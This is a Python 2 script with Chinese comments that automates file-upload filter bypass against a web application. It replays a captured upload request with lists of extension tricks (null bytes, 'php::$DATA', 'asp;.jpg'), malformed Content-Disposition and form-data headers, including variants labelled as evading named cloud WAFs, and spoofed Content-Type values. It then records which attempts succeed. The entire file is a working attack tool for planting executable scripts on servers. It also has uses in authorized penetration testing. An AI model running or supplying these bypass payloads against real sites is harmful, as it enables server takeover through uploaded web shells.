# -*-coding:utf-8-*-
# author = ske

# 请使用python2， 因为python3的字符串和字节区分的很明确，用3则无法把test替换为图片内容
# 使用该脚本测试的时候，上传的文件名为：1.jpg     内容为：testtesttesttesttesttest
# 因为脚本里替换的payload都是使用的1.jpg，所以如果是其他名字，程序会报错
# 因为不好定位上传文件的内容，所以请使用内容为testtesttesttesttesttest，这样程序可以定位到post包里上传的文件内容，然后用图片的内容去替换testtesttesttesttesttest
# 未写入脚本的payload：    filename换位置,放到content-type的下一行      put上传
# 无法根据payload的返回包长度去判断是否成功上传，因为payload的长度不同，即使都成功上传了，返回包的长度也可能不同，所以需要用特征值去判断
# 所以无论是否成功上传，都将返回包记录下来
# check_success.py脚本可以在所有返回包里再次检测是否成功上传

'''
先上传1.jpg文件，内容为testtesttesttesttesttest

运行脚本：
	1、输入http or https


脚本功能：
	1、文件扩展名绕过		http://www.chengyin.org/thread-2757-1-1.html
		初始提交1.php	然后尝试修改扩展名php为php1、php .jpg、php.123等等
	2、Content-Disposition	http://www.chengyin.org/thread-2758-1-1.html
		初始提交1.php	然后修改form-data、Content-Disposition
	3、content-type			http://www.chengyin.org/thread-2758-1-1.html
		初始提交1.php	然后修改content-type
'''

import requests
import re
from urllib import unquote
from termcolor import cprint
import time
import os

# 创建保存响应包的目录
save_path = os.getcwd() + '/ret/'
try:
    os.makedirs(save_path)
except Exception as e:
    pass

headers = {}                 # 请求头
post_data = []               # post的data数据
Content_Disposition_payload = []      # 保存Content_Disposition绕过的所有payload列表
content_type_payload = []             # 保存content_type绕过的所有payload列表
Suffix = ['html', 'exe', 'svg', 'xml', 'swf', 'php', 'asp', 'aspx', 'jsp', 'htaccess']       # 需要测试的能上传的文件类型
SLEEP_TIME = 0                        # 每次上传的间隔
#SUCCESS_FEATURE = str(raw_input('请输入上传成功后的返回包特征字符串： '))          # 可以证明成功上传的特征字符串
SUCCESS_FEATURE = 'succesful'
# 输入协议和脚本类型
def input_protocol_script():
    protocol = 'http'       # 协议默认为http

    print('input http or https : \n'
          '1 : http\n'
          '2 : https')
    protocol = 'http' if int(raw_input('choice : ')) == 1 else 'https'  # 协议

    return protocol

# 获取post里的host, url, headers, data
def get_headers_postdata(protocol):

    flag = False  # 标志，当设置为True时，开始取post包里的data数据

    with open('data.txt', 'rt') as f:
        path = str(f.readline()).split(' ')[1]
        host = str(f.readline()).split(': ')[1][:-1]
        # 上传文件的url
        url = protocol + '://' + host + path
        try:
            os.makedirs(save_path + host)
        except Exception as e:
            pass



        for each in f.readlines():

            # 获取post包里的data数据
            if flag:
                post_data.append(each)
                continue

            # 因为referer这一行有2个冒号
            if 'Referer' in each:
                headers['Referer'] = each[9:-1]
                continue

            # 因为User-Agen这一行有多个冒号
            if 'User-Agent' in each:
                headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0'
                continue

            # 在Content-Length后面都是提交的数据包
            if '\n' == each:
                flag = True     # 开始获取post包的data数据
                continue

            # 获取post内的请求头数据
            _key = each.split(': ')[0]
            _value = each.split(': ')[1][:-1]
            headers[_key] = _value
        return host, url, headers, post_data

# 保存返回包内容
def save_return_text(host, return_text, text_name='[0]normal'):
    '''

    :param host: 测试网站的域名，用来生成目录保存该域名下的所有测试后的返回包
    :param return_text: 测试后的返回包
    :param text_name: 保存的名字
    :return:
    '''
    save_text_path = save_path + host + '/' +  text_name + '.txt'
    with open(save_text_path, 'at') as f:
        f.write(return_text)


# 获取提交正常数据包的返回包长度
def get_normal_psot_length(host, url, headers, post_data):
    data = ''.join(post_data)
    res = requests.post(url=url, headers=headers, data=data)
    return_text = res.text
    normal_post_length = len(return_text)
    save_return_text(host=host, return_text=return_text)
    cprint('正常数据包的返回长度 ： {}'.format(normal_post_length), 'yellow')
    return normal_post_length



# 测试第一功能 脚本后缀绕过
def script_suffix_Fuzz(host, url, headers, post_data, normal_post_length):
    '''
    :param host: 测试网站的域名，用来寻找txt保存的目录文件
    :param url: 测试网站的上传路径
    :param headers: 请求头
    :param post_data: 要上传的数据包
    :param normal_post_length: 正常数据包的返回长度
    :return:
    '''
    cprint('第一功能：脚本后缀绕过（http://www.chengyin.org/thread-2757-1-1.html）', 'yellow')
    data = ''
    suffix_temp = []
    asp_fuzz = ['asp;.jpg', 'asp.jpg', 'asp;jpg', 'asp/1.jpg', 'asp{}.jpg'.format(unquote('%00')), 'asp .jpg',
                'asp_.jpg', 'asa', 'cer', 'cdx', 'ashx', 'asmx', 'xml', 'htr', 'asax', 'asaspp', 'asp;+2.jpg']
    aspx_fuzz = ['asPx', 'aspx .jpg', 'aspx_.jpg', 'aspx;+2.jpg', 'asaspxpx']
    php_fuzz = ['php1', 'php2', 'php3', 'php4', 'php5', 'pHp', 'php .jpg', 'php_.jpg', 'php.jpg', 'php.  .jpg', 'jpg/.php',
                'php.123', 'jpg/php', 'jpg/1.php', 'jpg{}.php'.format(unquote('%00')), 'php{}.jpg'.format(unquote('%00')),
                'php:1.jpg', 'php::$DATA', 'php::$DATA......', 'ph\np']
    jsp_fuzz = ['.jsp.jpg.jsp', 'jspa', 'jsps', 'jspx', 'jspf', 'jsp .jpg', 'jsp_.jpg']
    suffix_fuzz = asp_fuzz + aspx_fuzz + php_fuzz + jsp_fuzz


    # 取出post包里的每一行数据
    for each_line in post_data:
        # Content_Disposition_payload
        if 'filename' in each_line:
            # 获取post包里正在上传文件的后缀
            filename_suffix = re.search('filename=".[.](.*)"', each_line).group(1)

            # 遍历每个需要测试的上传后缀
            for each_suffix in suffix_fuzz:
                # 测试每个上传后缀
                temp = each_line.replace(filename_suffix, '{}'.format(each_suffix))
                suffix_temp.append(temp)

    # 开始测试
    for i, payload in enumerate(suffix_temp):
        # 对每个pyload设置一个新的data数据包
        for each_line in post_data:

            # 定位上传文件内容位置，用图片内容去替换它
            if 'testtesttesttesttesttest' in each_line:
                with open('2.jpg', 'rb') as f:  # 用字节格式打开
                    pic = f.read() + '\n'  # 一定要加换行符，否则无法上传
                    data += pic
                continue
            if 'filename' not in each_line:
                data += each_line
                continue
            if 'filename' in each_line:
                data += payload
                continue

        res = requests.post(url=url, headers=headers, data=data)
        return_text = res.text
        payload_post_length = len(return_text)          # payload的返回包长度

        if SUCCESS_FEATURE in res.text:
            cprint('[+{}] [{}]: {}'.format(i + 1, payload_post_length, payload), 'blue')
        else:
            cprint('[-{}] [{}]: {}'.format(i + 1, payload_post_length, payload), 'red')
        save_return_text(host=host, return_text=return_text, text_name='[1]' + str(i))          # 无论是否成功上传，都将返回包记录下来
        data = ''  # 初始化
        time.sleep(SLEEP_TIME)

# 测试第二功能 Content-Disposition 绕过  form-data 绕过  filename 绕过
def CFF_Fuzz(host, url, headers, post_data, normal_post_length):
    '''
    第二功能    Content-Disposition 绕过  form-data 绕过  filename 绕过
        参考：http://www.chengyin.org/thread-2758-1-1.html
        filename="1.php(Suffix列表里的元素)"	然后修改form-data、Content-Disposition
    :return:
    '''
    cprint('第二功能：Content-Disposition 绕过  form-data 绕过  filename 绕过（http://www.chengyin.org/thread-2758-1-1.html）', 'yellow')
    data = ''
    # 取出post包里的每一行数据
    for each_line in post_data:
        # Content_Disposition_payload
        if 'filename' in each_line:
            # 获取post包里正在上传文件的后缀
            filename_suffix = re.search('filename=".[.](.*)"', each_line).group(1)

            # 遍历每个需要测试的上传后缀
            for each_suffix in Suffix:

                # 测试每个上传后缀
                temp = each_line.replace(filename_suffix, '{}'.format(each_suffix))
                Content_Disposition_payload.append(temp.replace('Content-Disposition', 'content-Disposition'))  # 改变大小写
                Content_Disposition_payload.append(temp.replace('Content-Disposition: ', 'content-Disposition:'))  # 减少一个空格
                Content_Disposition_payload.append(temp.replace('Content-Disposition: ', 'content-Disposition:  '))         # 增加一个空格
                Content_Disposition_payload.append(temp.replace('form-data', '~form-data'))
                Content_Disposition_payload.append(temp.replace('form-data', 'f+orm-data'))
                Content_Disposition_payload.append(temp.replace('form-data', '*'))
                Content_Disposition_payload.append(temp.replace('form-data; ', 'form-data;  '))                             # 增加一个空格
                Content_Disposition_payload.append(temp.replace('form-data; ', 'form-data;'))                               # 减少一个空格
                Content_Disposition_payload.append(temp.replace('filename="1.{}"'.format(each_suffix), 'filename="1.{}\n"'.format(each_suffix)))                  # 过阿里云waf
                Content_Disposition_payload.append(temp.replace('filename="1.{}"'.format(each_suffix), 'filename="1.jpg\nC.{}"'.format(each_suffix)))             # 过安全狗和云锁waf    # 待定，因为没法删掉Content-Type
                Content_Disposition_payload.append(temp.replace('filename="1.{}"'.format(each_suffix), 'filename\n="1.{}"'.format(each_suffix)))                  # 过百度云waf
                Content_Disposition_payload.append(temp.replace('filename="1.{}"'.format(each_suffix), 'filename="1.jpg";filename="1.{}"'.format(each_suffix)))   # 双参数




    # 开始测试
    for i, payload in enumerate(Content_Disposition_payload):
        # 对每个pyload设置一个新的data数据包
        for each_line in post_data:

            # 定位上传文件内容位置，用图片内容去替换它
            if 'testtesttesttesttesttest' in each_line:
                with open('2.jpg', 'rb') as f:  # 用字节格式打开
                    pic = f.read() + '\n'       # 一定要加换行符，否则无法上传
                    data += pic
                continue
            if 'filename' not in each_line:
                data += each_line
                continue
            if 'filename' in each_line:
                data += payload
                continue

        res = requests.post(url=url, headers=headers, data=data)
        return_text = res.text
        payload_post_length = len(return_text)  # payload的返回包长度

        if SUCCESS_FEATURE in res.text:
            cprint('[+{}] [{}]: {}'.format(i + 1, payload_post_length, payload), 'blue')
        else:
            cprint('[-{}] [{}]: {}'.format(i + 1, payload_post_length, payload), 'red')
        save_return_text(host=host, return_text=return_text, text_name='[2]' + str(i))  # 无论是否成功上传，都将返回包记录下来
        data = ''       # 初始化
        time.sleep(SLEEP_TIME)

# 测试第三功能 content-type 绕过
def content_type_Fuzz(host, url, headers, post_data, normal_post_length):
    '''
    # 测试第三功能 content-type 绕过
        参考：http://www.chengyin.org/thread-2758-1-1.html
        filename="1.php(Suffix列表里的元素)"	然后修改content-type
    :return:
    '''
    cprint('第三功能：content-type绕过（http://www.chengyin.org/thread-2758-1-1.html）','yellow')
    data = ''

    # 取出post包里的每一行数据
    for each_line in post_data:
        # content_type_payload
        if 'Content-Type' in each_line:
            content_type_payload.append(each_line.replace(each_line, 'Content-Type: image/gif'))      # 修改为image/gif
            content_type_payload.append(each_line.replace(each_line, 'Content-Type: image/jpeg'))     # 修改为image/jpeg
            content_type_payload.append(each_line.replace(each_line, 'Content-Type: application/php'))  # 修改为image/jpeg
            content_type_payload.append(each_line.replace(each_line, 'Content-Type: text/plain'))  # 修改为text/plain
            content_type_payload.append(each_line.replace(each_line, ''))
            content_type_payload.append(each_line.replace('Content-Type', 'content-type'))       # 改变大小写
            content_type_payload.append(each_line.replace('Content-Type: ', 'Content-Type:  '))  # 冒号后面 增加一个空格

    # 开始测试
    # 对每个pyload设置一个新的data数据包
    num = 0
    for payload in content_type_payload:
        # 遍历每个需要测试的上传后缀
        for each_suffix in Suffix:
            for each_line in post_data:

                # 定位上传文件内容位置，用图片内容去替换它
                if 'testtesttesttesttesttest' in each_line:
                    with open('2.jpg', 'rb') as f:  # 用字节格式打开
                        pic = f.read() + '\n'  # 一定要加换行符，否则无法上传
                        data += pic
                    continue
                if 'filename' not in each_line and 'Content-Type' not in each_line:
                    data += each_line
                    continue
                if 'filename' in each_line:
                    # 获取post包里正在上传文件的后缀
                    filename_suffix = re.search('filename=".[.](.*)"', each_line).group(1)
                    # 设置上传的文件后缀
                    data += each_line.replace(filename_suffix, '{}'.format(each_suffix))
                    continue
                if 'Content-Type' in each_line:
                    data += payload
                    continue

            #print('[{}] : [{}] {}'.format(num, each_suffix, payload.strip()))
            res = requests.post(url=url, headers=headers, data=data)
            return_text = res.text
            payload_post_length = len(return_text)  # payload的返回包长度

            if SUCCESS_FEATURE in res.text:
                cprint('[+{}] [{}]: {}'.format(num, payload_post_length, payload), 'blue')
            else:
                cprint('[-{}] [{}]: {}'.format(num, payload_post_length, payload), 'red')
            save_return_text(host=host, return_text=return_text, text_name='[3]' + str(num))  # 无论是否成功上传，都将返回包记录下来
            data = ''  # 初始化
            num += 1
            time.sleep(SLEEP_TIME)


if __name__ == '__main__':
    # protocol, script_suffix = protocol_script()
    protocol = 'http'
    host, url, headers, post_data = get_headers_postdata(protocol)
    cprint('url : {}\nheaders : {}\npost_data : {}'.format(url, headers, post_data), 'yellow')
    normal_post_length = get_normal_psot_length(host, url, headers, post_data)  # 获取正常数据长度
    script_suffix_Fuzz(host, url, headers, post_data, normal_post_length)       # 执行第一功能
    CFF_Fuzz(host, url, headers, post_data, normal_post_length)                 # 执行第二功能
    content_type_Fuzz(host, url, headers, post_data, normal_post_length)        # 执行第三功能



